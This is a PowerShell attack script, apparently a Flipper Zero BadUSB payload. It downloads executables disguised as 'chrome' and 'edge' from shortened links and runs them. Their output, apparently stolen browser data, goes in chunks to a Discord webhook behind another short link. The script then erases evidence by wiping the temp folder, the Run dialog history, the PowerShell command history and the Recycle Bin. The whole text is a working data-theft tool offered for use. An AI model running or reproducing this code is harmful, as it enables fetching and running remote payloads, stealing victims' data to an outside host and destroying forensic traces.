############################################################################################################################################################
$browsers_urls = @("https://bit.ly/4eTYp9M", "https://bit.ly/3RNaFPb")
$browsers = @("chrome", "edge")

for ($i = 0; $i -lt $browsers.Count; $i++) {
    $exeUrl = $browsers_urls[$i]
	$browser = $browsers[$i]
    $exePath = "$env:TEMP/pe/$browser.exe"

    if (-not (Test-Path -Path "$env:TEMP/pe")) {
        New-Item -ItemType Directory -Path "$env:TEMP/pe"
    }

    if (-not (Test-Path -Path $exePath)) {
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
        } catch {
            Write-Host "Error downloading $browser executable: $_"
            continue
        }
    }

    try {
        $commandOutput = & $exePath | Out-String
    } catch {
        Write-Host "Error executing $browser executable: $_"
        continue
    }

    $chunks = [Math]::Ceiling($commandOutput.Length / 2000)
    for ($i = 0; $i -lt $chunks; $i++) {
        $start = $i * 2000
        $length = [Math]::Min(2000, $commandOutput.Length - $start)
        $content = $commandOutput.Substring($start, $length)
        Upload-Discord -text $content
    }
}

function Upload-Discord {param ([string]$text)
    $hookurl = ExpandURL 'https://bit.ly/3VZTOvb'

    $Body = @{
        'username' = 'Flipper'
        'content' = $text
    } | ConvertTo-Json

    if (-not ([string]::IsNullOrEmpty($text))) {
        try {
            Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method Post -Body $Body
        } catch {
            Write-Host "Error invoking REST method: $_"
        }
    }
}

function ExpandURL {param ([string]$URL)
    (Invoke-WebRequest -MaximumRedirection 0 -Uri $URL -ErrorAction SilentlyContinue).Headers.Location
}

############################################################################################################################################################

function Clean-Exfil { 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

Clean-Exfil